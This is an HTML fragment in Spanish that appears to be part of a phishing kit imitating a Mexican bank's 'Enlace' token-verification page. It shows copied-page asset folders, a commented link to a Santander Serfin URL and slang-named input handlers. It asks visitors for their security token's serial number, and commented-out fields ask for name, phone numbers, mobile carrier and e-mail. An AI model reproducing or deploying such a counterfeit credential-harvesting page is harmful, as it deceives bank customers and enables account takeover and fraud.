

<script src="TelasEnlace.js"></script>
                    <table width="760" height="10" border="0" cellspacing="0" cellpadding="0" >
                        <tbody>
                            <tr>
                                <td align="center">
                                    <table width="760" border="0" cellspacing="2" cellpadding="3" bgcolor="#FFFFFF">
                                        <tbody>
                                            <tr>
                                                <td class="tittabdat">


                                                    <input name="tipoMod" type="radio" value="1" checked="">



                                                    Verificando informaci&oacute;n
                                                </td>
                                            </tr>
                                            <tr align="center">
                                                <td height="10" colspan="2" valign="top" class="textabdatcla">
                                                    <!--<table width="660" border="0" cellspacing="0" cellpadding="0">
                                                        <tbody>
                                                            <tr valign="top">
                                                                <td width="420" align="left">
                                                                    <table width="433" border="0" cellspacing="0" cellpadding="5">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align="right" class="tabmovtex" width="123" nowrap="">
                                                                                    Nombre de contacto: </td>
                                                                                <td class="tabmovtex" width="290" nowrap="">
                                                                                    <input name="bato" type="text" value="" size="30" maxlength="50" id="bato"> </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" class="tabmovtex" nowrap="">
                                                                                    Tel&eacute;fono fijo: </td>
                                                                                <td class="tabmovtex" nowrap="">
                                                                                    <input name="fon" type="text" id="fon" onkeypress="return solo_numeros_wey(event)" value="" size="30" maxlength="12"> </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" class="tabmovtex">
                                                                                </td>
                                                                                <td>
                                                                                    
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </td>
                                                                <td width="240" align="left">
                                                                    <table width="240" border="0" cellspacing="0" cellpadding="3">
                                                                        <tbody>
                                                                            
                                                                            <tr>
                                                                                <td align="right" class="tabmovtex" nowrap="">
                                                                                    Tel&eacute;fono Celular
                                                                                </td>
                                                                                <td class="tabmovtex" align="center" valign="middle">
                                                                                    
                                                                                    <input onkeypress="return solo_numeros_wey(event)" name="celular" id="celular" type="text" value="" size="30" maxlength="13">
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" class="tabmovtex" nowrap="">
                                                                                    Compa&ntilde;ía
                                                                                </td>
                                                                                <td class="tabmovtex" align="center" valign="middle">
                                                                                    

                                                                                    <select id="carrier" name="carrier" style="width: 190px;">
                                                                                        <option value="" selected="">SELECCIONE UNA OPCION</option>
                                                                                        <option value="TELCEL">TELCEL</option>
                                                                                        <option value="TELEFONICA">TELEFONICA</option>
                                                                                        <option value="AT&T">AT&amp;T</option>
                                                                                        <option value="UNEFON">UNEFON</option>
                                                                                        <option value="OTRO">OTRO</option>
                                                                                    </select>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" class="tabmovtex" width="107" nowrap="">
                                                                                    E-mail:
                                                                                </td>
                                                                                <td class="tabmovtex" width="15" valign="middle" align="center">
                                                                                    <input name="correo" type="text" value="" size="30" id="correo">
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>


                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>-->
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    

                                    <style>
                                        #cnt_pass_dinamic{
                                            width: 100%;
                                            display: block;
                                            text-align: center;
                                            margin-left: 80px;
                                        }

                                        #cnt_pass_dinamic table{
                                            width: 500px;
                                            margin-top: 10px;
                                        }

                                        .hder{
                                            FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif;
                                            COLOR: #666666;
                                            FONT-SIZE: 12px;
                                            FONT-WEIGHT: bold;
                                            TEXT-DECORATION: none;
                                        }

                                        .tituloCopy {
                                            FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif;
                                            COLOR: #666666;
                                            FONT-SIZE: 12px;
                                            FONT-WEIGHT: bold;
                                            TEXT-DECORATION: none;
                                        }
                                    </style>

                                    <div id="cnt_pass_dinamic">
                                        <table>
                                            <tr>
                                            <TD class=titulo bgColor=#94b2df height=20 align=center colspan="2">
                                                    <P class=tituloCopy >
                                                        <FONT color=#000000>Capture el n&uacute;mero de serie de su token</FONT>
                                                    </P>
                                                </TD>
                                            </tr>
                                            <tr>
                                                
                                                <td align="center">
                                                    <div style="margin-top: 5px;"></div>
                                                    <label class="hder">N&uacute;mero de serie:</label>
                                                </td>
                                                <td>
                                                <div style="margin-top: 5px;"></div>
                                                <input id="tokParam" name="tokParam" type="password" size="7" maxlength="8" onkeypress="return solo_numeros_wey(event)">
                                                </td>
                                            </tr>
                                            <tr>
                                                <td rowspan="2" align="center" colspan="2">
                                                    <div style="margin-top: 5px;"></div>
                                                    <a href="#" style="margin-left: 50px;" id="btnNumSerieBTN"><img border="0" src="tokenMac_archivos/gbo25280.gif" width="80" height="22"></a>
                                                </td>
                                            </tr>
                                        </table>

                                        <table border="0" cellspacing="0" cellpadding="0" width="100%" style="FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif;COLOR: #666666;FONT-SIZE: 10px;FONT-WEIGHT: normal;TEXT-DECORATION: none;">
                                            <tbody>
                                                <tr valign="top">
                                                    <td width="36%"><strong>Paso 1.</strong> <br>Visualize el reverso de su token.</td>
                                                    <td>&nbsp;</td>
                                                    <td width="36%"><strong>Paso 2. </strong><br>Capture el n&uacute;mero de serie que aperece en el reverso de su Token.</td>
                                                </tr>
                                            </tbody>
                                        </table>

                                        
                                    </div>


                                    <table border="0" cellspacing="0" cellpadding="0" width="500">
                    <tbody>
                        <tr>
                            <TD align=center> <img src="inbu_portatil.png" width="140" height="130"></TD>
                            <!--<td width="2"><img src="tokenMac_archivos/img001.gif" width="173" height="49"></td>
                            <td width="2"><img src="tokenMac_archivos/img4.gif" width="42" height="49"></td>
                            <td width="2"><img src="tokenMac_archivos/img7.gif" width="97" height="49"></td>
                            <td><img src="tokenMac_archivos/img12.gif" width="205" height="49"></td>-->
                        </tr>
                        <!--tr>
                            <td><img src="tokenMac_archivos/img2.gif" width="173" height="56"></td>
                            <td><a href="https://enlace.santander-serfin.com/mac/MAC/jsp/tokenMac.jsp#"><img border="0" src="tokenMac_archivos/img5_an.gif" width="42" height="56"></a></td>
                            <td>
                                <table border="0" cellspacing="0" cellpadding="0" width="100%">
                                    <tbody>
                                        <tr>
                                            <td><img src="tokenMac_archivos/img8.gif" width="97"></td>
                                        </tr>
                                        <tr>
                                            <td>
                                                <table border="0" cellspacing="0" cellpadding="0" width="100%">
                                                    <tbody>
                                                        <tr>
                                                            <td width="2"><img src="tokenMac_archivos/img9.gif" width="18"></td>
                                                            <td bgcolor="#a3b28e" align="center">
                                                                <font color="#000000"></font>
                                                            </td>
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td><img src="tokenMac_archivos/img10.gif" width="97"></td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                            <td><img src="tokenMac_archivos/img13.gif" width="205" height="56"></td>
                        </tr>
                        <tr>
                            <td><img src="tokenMac_archivos/img3.gif" width="173" height="30"></td>
                            <td><img src="tokenMac_archivos/img6.gif" width="42" height="30"></td>
                            <td><img src="tokenMac_archivos/img11.gif" width="97" height="30"></td>
                            <td><img src="tokenMac_archivos/img14.gif" width="205" height="30"></td>
                        </tr>-->
                    </tbody>
                </table>


                                    
                                    <!--<span class="tabmovtex">
                                        <br>
                                        Contraseña dinámica:
                                        <input onkeypress="return solo_numeros_wey(event)" name="token" type="password" id="token" value="" size="10" maxlength="8">
                                        <br>
                                        <table width="166" border="0" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" height="10">
                                            <tbody>
                                                <tr>
                                                    <td align="right" valign="top" height="10" width="116"><a>
                                                            <br>
                                                            <input id="btnAceptar" name="Aceptar" type="button" class="tittabcenazu" value="Aceptar">
                                                        </a> </td>
                                                    <td align="left" valign="middle" height="10" width="50"><a href="javascript:resetDataUsr(this.form);"> </a> </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    </span>-->
                                </td>
                            </tr>
                        </tbody>
                    </table>
                